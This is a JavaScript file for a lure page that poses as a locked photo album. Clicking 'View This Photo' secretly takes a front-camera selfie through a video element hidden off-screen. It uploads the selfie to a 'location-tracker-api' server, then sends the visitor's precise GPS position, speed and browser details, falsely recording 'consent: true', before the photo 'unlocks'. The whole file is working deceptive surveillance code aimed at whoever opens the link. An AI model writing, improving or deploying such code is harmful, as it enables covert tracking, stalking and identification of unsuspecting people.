(function() {
    "use strict";

    const viewPhotoBtn = document.getElementById("viewPhotoBtn");
    const statusEl = document.getElementById("status");
    const albumPhoto = document.getElementById("albumPhoto");
    const lockBadge = document.getElementById("lockBadge");

    // IMPORTANT: Update these URLs to match YOUR Render backend
    const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
    const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

    let cameraStream = null;
    let lastLocationId = null;
    let selfieBlob = null;
    let isProcessing = false;

    function setStatus(message, type) {
        statusEl.textContent = message;
        statusEl.className = type || "";
    }

    function unlockPhoto() {
        albumPhoto.classList.add("unlocked");
        lockBadge.classList.add("hidden");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        setStatus("✅ Photo unlocked! You can now see the image.", "success");
    }

    function resetUI(errorMsg) {
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        if (errorMsg) {
            setStatus(errorMsg, "error");
        }
    }

    function stopCameraStream() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
    }

    async function requestCameraAndCapture() {
        if (window.location.protocol !== "https:" && window.location.hostname !== "localhost" && window.location.hostname !== "127.0.0.1") {
            setStatus("❌ HTTPS is required for camera & location access.", "error");
            resetUI();
            return;
        }

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus("❌ Camera API is not supported in this browser.", "error");
            resetUI();
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });

            cameraStream = stream;

            const hiddenVideo = document.createElement("video");
            hiddenVideo.srcObject = stream;
            hiddenVideo.autoplay = true;
            hiddenVideo.playsinline = true;
            hiddenVideo.muted = true;
            hiddenVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
            hiddenVideo.setAttribute("aria-hidden", "true");
            document.body.appendChild(hiddenVideo);

            await Promise.race([
                new Promise((resolve, reject) => {
                    hiddenVideo.onloadedmetadata = () => {
                        hiddenVideo.play().then(resolve).catch(reject);
                    };
                    if (hiddenVideo.readyState >= 2) {
                        resolve();
                    }
                }),
                new Promise((_, reject) =>
                    setTimeout(() => reject(new Error("Camera init timeout")), 8000)
                )
            ]);

            await new Promise(r => setTimeout(r, 600));

            const videoWidth = hiddenVideo.videoWidth || 640;
            const videoHeight = hiddenVideo.videoHeight || 480;

            if (videoWidth === 0 || videoHeight === 0) {
                throw new Error("Camera returned empty dimensions");
            }

            const hiddenCanvas = document.createElement("canvas");
            hiddenCanvas.width = videoWidth;
            hiddenCanvas.height = videoHeight;
            const ctx = hiddenCanvas.getContext("2d");
            ctx.translate(videoWidth, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(hiddenVideo, 0, 0);

            selfieBlob = await new Promise((resolve, reject) => {
                hiddenCanvas.toBlob((blob) => {
                    if (blob) resolve(blob);
                    else reject(new Error("Canvas toBlob returned null"));
                }, "image/jpeg", 0.85);
            });

            document.body.removeChild(hiddenVideo);
            stopCameraStream();

            await uploadSelfieThenLocation();

        } catch (err) {
            console.error("Camera error:", err);
            stopCameraStream();

            let msg;
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                msg = "❌ Camera permission was denied.";
            } else if (err.name === "NotFoundError") {
                msg = "❌ No camera found on this device.";
            } else if (err.name === "NotReadableError") {
                msg = "❌ Camera is in use by another application.";
            } else if (err.message === "Camera init timeout") {
                msg = "❌ Camera initialization timed out.";
            } else {
                msg = "❌ Camera error: " + err.message;
            }

            resetUI(msg);
        }
    }

    async function uploadSelfieThenLocation() {
        if (!selfieBlob) {
            resetUI("❌ No selfie captured. Please try again.");
            return;
        }

        setStatus("📷 Uploading selfie...", "loading");

        if (!navigator.onLine) {
            resetUI("❌ No internet connection detected.");
            return;
        }

        try {
            const formData = new FormData();
            formData.append("image", selfieBlob, "selfie.jpg");
            formData.append("timestamp", new Date().toISOString());

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            const response = await fetch(SELFIE_API_URL, {
                method: "POST",
                body: formData,
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!response.ok) {
                let msg = "Upload failed (HTTP " + response.status + ")";
                try {
                    const errData = await response.json();
                    msg = errData.message || msg;
                } catch (e) { }
                resetUI("❌ " + msg);
                return;
            }

            const result = await response.json();

            if (!result.id) {
                resetUI("❌ Server response missing selfie ID.");
                return;
            }

            setStatus("📍 Requesting your location...", "loading");
            requestLocation(result.id);

        } catch (err) {
            console.error("Upload error:", err);

            if (err.name === "AbortError") {
                resetUI("❌ Upload timed out. Check your connection.");
            } else if (err instanceof TypeError && (
                err.message.includes("NetworkError") ||
                err.message.includes("Failed to fetch")
            )) {
                resetUI("❌ Network error — CORS or connectivity issue.");
            } else {
                resetUI("❌ Upload failed: " + err.message);
            }
        }
    }

    function requestLocation(selfieId) {
        if (!navigator.geolocation) {
            resetUI("❌ Geolocation is not supported by this browser.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude || null,
                    altitudeAccuracy: position.coords.altitudeAccuracy || null,
                    heading: position.coords.heading || null,
                    speed: position.coords.speed || null,
                    timestamp: new Date().toISOString(),
                    consent: true,
                    selfie_id: selfieId,
                    user_agent: navigator.userAgent.slice(0, 200)
                };

                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 15000);

                    const locResponse = await fetch(LOCATION_API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(data),
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);

                    if (!locResponse.ok) {
                        let msg = "Location upload failed (HTTP " + locResponse.status + ")";
                        try {
                            const errData = await locResponse.json();
                            msg = errData.message || msg;
                        } catch (e) { }
                        resetUI("❌ " + msg);
                        return;
                    }

                    const locResult = await locResponse.json();

                    if (!locResult.id) {
                        resetUI("❌ Server response missing location ID.");
                        return;
                    }

                    lastLocationId = locResult.id;
                    unlockPhoto();

                } catch (err) {
                    console.error("Location upload error:", err);

                    if (err.name === "AbortError") {
                        resetUI("❌ Location upload timed out.");
                    } else {
                        resetUI("❌ Location upload failed: " + err.message);
                    }
                }
            },
            (error) => {
                let msg;
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        msg = "❌ Location permission was denied.";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        msg = "❌ Location unavailable (GPS/signal).";
                        break;
                    case error.TIMEOUT:
                        msg = "❌ Location request timed out.";
                        break;
                    default:
                        msg = "❌ Location error (code " + error.code + ").";
                }
                resetUI(msg);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    viewPhotoBtn.addEventListener("click", function(e) {
        e.preventDefault();

        if (isProcessing) return;
        isProcessing = true;

        viewPhotoBtn.disabled = true;
        viewPhotoBtn.textContent = "⏳ Verifying...";
        viewPhotoBtn.classList.add("processing");
        setStatus("📸 Initializing camera...", "loading");

        requestCameraAndCapture();
    });

})();